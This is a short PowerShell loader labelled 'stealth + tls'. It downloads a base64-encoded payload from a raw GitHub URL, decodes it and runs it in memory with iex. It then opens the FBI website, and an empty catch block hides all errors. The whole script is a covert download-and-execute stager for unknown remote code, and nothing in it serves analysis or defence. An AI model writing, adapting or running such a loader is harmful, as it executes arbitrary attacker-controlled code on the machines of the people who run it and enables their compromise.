# stealth + tls
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

try {
    $u = "https://raw.githubusercontent.com/Extremelyz/shhhhh/refs/heads/main/payload.b64"

    $b = (New-Object Net.WebClient).DownloadString($u)

    # decode
    $d = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b))

    # run
    iex $d

    # optional: เปิดเว็บ
    Start-Process "https://www.fbi.gov/"

} catch {}